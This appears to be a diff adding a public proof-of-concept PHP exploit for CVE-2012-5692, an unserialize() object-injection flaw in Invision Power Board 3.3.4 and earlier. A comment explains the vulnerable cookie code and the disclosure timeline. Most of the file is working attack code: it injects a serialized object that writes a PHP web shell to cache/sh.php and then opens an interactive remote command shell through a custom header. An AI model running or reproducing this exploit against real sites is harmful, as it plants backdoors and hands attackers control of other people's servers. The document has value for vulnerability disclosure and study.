@@ -1,0 +1,113 @@
+<?php
+
+/*
+    ----------------------------------------------------------------
+    Invision Power Board <= 3.3.4 "unserialize()" PHP Code Execution
+    ----------------------------------------------------------------
+    
+    author..............: Egidio Romano aka EgiX
+    mail................: n0b0d13s[at]gmail[dot]com
+    software link.......: http://www.invisionpower.com/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerable code in IPSCookie::get() method defined in /admin/sources/base/core.php
+    
+    4015.        static public function get($name)
+    4016.        {
+    4017.            // Check internal data first
+    4018.            if ( isset( self::$_cookiesSet[ $name ] ) )
+    4019.            {
+    4020.                return self::$_cookiesSet[ $name ];
+    4021.            }
+    4022.            else if ( isset( $_COOKIE[ipsRegistry::$settings['cookie_id'].$name] ) )
+    4023.            {
+    4024.                $_value = $_COOKIE[ ipsRegistry::$settings['cookie_id'].$name ];
+    4025.    
+    4026.                if ( substr( $_value, 0, 2 ) == 'a:' )
+    4027.                {
+    4028.                    return unserialize( stripslashes( urldecode( $_value ) ) );
+    4029.                }
+    
+    The vulnerability is caused due to this method unserialize user input passed through cookies without a proper
+    sanitization. The only one check is done at line 4026,  where is controlled that the serialized string starts
+    with 'a:',  but this is not  sufficient to prevent a  "PHP Object Injection"  because an attacker may send  a
+    serialized string which represents an array of objects.  This can be  exploited to execute arbitrary PHP code
+    via the  "__destruct()" method of the  "dbMain" class,  which calls the "writeDebugLog" method to write debug
+    info into a file.  PHP code may  be injected  only through the  $_SERVER['QUERY_STRING']  variable,  for this
+    reason successful exploitation of this vulnerability requires short_open_tag to be enabled.
+
+    [-] Disclosure timeline:
+    
+    [21/10/2012] - Vulnerability discovered
+    [23/10/2012] - Vendor notified
+    [25/10/2012] - Patch released: http://community.invisionpower.com/topic/371625-ipboard-31x-32x-and-33x-security-update
+    [25/10/2012] - CVE number requested
+    [29/10/2012] - Assigned CVE-2012-5692
+    [31/10/2012] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set('default_socket_timeout', 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n[-] No response from {$host}:80\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+---------------------------------------------------------------------+";
+print "\n| Invision Power Board <= 3.3.4 Remote Code Execution Exploit by EgiX |";
+print "\n+---------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /ipb/\n";
+    die();
+}
+
+list($host, $path) = array($argv[1], $argv[2]);
+
+$packet  = "GET {$path}index.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+    
+$_prefix = preg_match('/Cookie: (.+)session/', http_send($host, $packet), $m) ?  $m[1] : '';
+
+class db_driver_mysql
+{
+    public $obj = array('use_debug_log' => 1, 'debug_log' => 'cache/sh.php');
+}
+
+$payload = urlencode(serialize(array(new db_driver_mysql)));
+$phpcode = '<?error_reporting(0);print(___);passthru(base64_decode($_SERVER[HTTP_CMD]));die;?>';
+
+$packet  = "GET {$path}index.php?{$phpcode} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: {$_prefix}member_id={$payload}\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+http_send($host, $packet);
+
+$packet  = "GET {$path}cache/sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+if (preg_match('/<\?error/', http_send($host, $packet))) die("\n[-] short_open_tag disabled!\n");
+
+while(1)
+{
+    print "\nipb-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
